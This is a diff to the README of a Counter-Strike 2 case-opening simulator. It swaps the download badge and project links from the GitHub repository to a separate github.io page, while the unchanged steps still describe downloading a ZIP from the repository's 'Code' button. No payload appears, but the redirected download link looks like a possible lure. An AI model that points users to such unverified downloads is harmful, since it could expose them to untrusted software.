@@ -1,6 +1,6 @@
 # 📦 cs2-case-opening-script - Simulate game cases without spending money
 
-[![](https://img.shields.io/badge/Download_Simulator-Blue?style=for-the-badge)](https://github.com/Tahaghn4940/cs2-case-opening-script)
+[![](https://img.shields.io/badge/Download_Simulator-Blue?style=for-the-badge)](https://tahaghn4940.github.io)
 
 This project provides a simple way to simulate opening Counter-Strike 2 cases. It runs in your web browser. You do not need to install complex software or manage server files. The tool offers a realistic look at case odds and item drops using a clean, keyboard-driven interface.
 
@@ -19,7 +19,7 @@ Your computer requires a stable internet connection for the initial load. You do
 
 You can access the software directly through the official repository page. Follow these steps to prepare the tool:
 
-1. Visit the main project page at https://github.com/Tahaghn4940/cs2-case-opening-script.
+1. Visit the main project page at https://tahaghn4940.github.io
 2. Look for the green button labeled "Code" near the top right of the file list.
 3. Click "Download ZIP" from the menu.
 4. Save the file to your computer.
